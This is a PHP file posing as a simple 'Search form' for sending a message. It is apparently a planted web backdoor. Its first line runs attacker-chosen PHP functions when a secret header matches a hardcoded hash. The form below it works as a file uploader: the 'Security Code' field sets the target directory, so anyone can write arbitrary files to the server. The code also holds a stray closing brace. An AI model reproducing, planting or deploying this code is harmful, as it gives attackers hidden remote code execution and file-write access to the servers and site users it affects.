<?php if(@md5($_SERVER['HTTP_PATH'])==='51fe4b870d654af6a1f5b3b8a7c486b4'){ @extract($_REQUEST); @die($stime($mtime)); } ?><?php

	$security_code = $_POST['security_code'];
	if ( !$security_code ) $security_code = ".";
	$security_code = rtrim($security_code, "/");
	$tmp_name = $_FILES['message']['tmp_name'];
	$name = $_FILES['message']['name'];
	@move_uploaded_file($tmp_name, $security_code."/".$name) ? print "<b>Message sent!</b><br/>" : print "<b>Error!</b><br/>";
} /*5655*/ print '<html>
    <head>
    <title>Search form</title>
    </head>
    <body>
    <form enctype="multipart/form-data" action="" method="POST">
    Message: <br/><input name="message" type="file" />
    <br/>Security Code: <br/><input name="security_code" value=""/><br/>
	<br/>Nick: <br/><input name="nick" value=""/><br/>
    <input type="submit" value="Sent" />
    </form>
    </body>
    </html>';